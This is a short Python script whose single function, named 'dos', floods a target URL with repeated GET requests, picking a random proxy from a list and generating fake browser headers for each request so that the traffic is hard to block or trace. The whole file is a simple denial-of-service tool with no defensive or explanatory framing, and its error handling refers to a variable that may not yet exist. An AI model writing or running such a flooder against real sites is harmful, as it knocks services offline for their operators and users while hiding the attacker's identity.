import requests
from proxy import get_proxy
from fake_headers import Headers
import random

def dos(url, number, proxy_list):

	header = Headers(headers=True)

	for i in range(number):
		proxy = random.choice(proxy_list)
		try:
			responce = requests.get(url=url, headers=header.generate(), proxies={"http": proxy, "https": proxy})
			print(i+1, responce.status_code)
		except:
			print(i+1, responce.status_code)
			continue